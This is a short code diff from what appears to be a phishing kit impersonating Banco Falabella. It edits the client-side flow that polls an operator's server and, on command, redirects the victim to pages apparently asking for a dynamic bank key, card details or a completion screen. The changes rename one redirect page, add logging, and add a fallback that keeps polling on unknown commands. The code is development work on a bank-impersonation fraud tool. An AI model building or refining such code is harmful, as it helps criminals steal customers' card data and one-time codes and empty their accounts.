@@ -360,11 +360,12 @@ const mensaje = `💎BANCO FALABELLA💎
         });
 
         const result = await res.json();
+        console.log('verificar_respuesta result', result);
 
         if (result.action) {
             switch (result.action) {
                 case 'pedir_dinamica':
-                    window.location.href = "token.php";
+                    window.location.href = "pedir_dinamica.php";
                     break;
                 case 'error_logo':
                     $("#mensaje").hide();
@@ -372,10 +373,14 @@ const mensaje = `💎BANCO FALABELLA💎
                     window.location.href = "index.php";
                     break;
                 case 'error_tc':
-                    window.location.href = "tarjeta.php"; // <- agrega si aún no lo tienes
+                    window.location.href = "tarjeta.php";
                     break;
                 case 'confirm_finalizar':
-                    window.location.href = "finalizado.php"; // <- si tienes ruta final
+                    window.location.href = "finalizado.php";
+                    break;
+                default:
+                    console.warn('Action desconocida', result.action);
+                    setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
                     break;
             }
         } else {
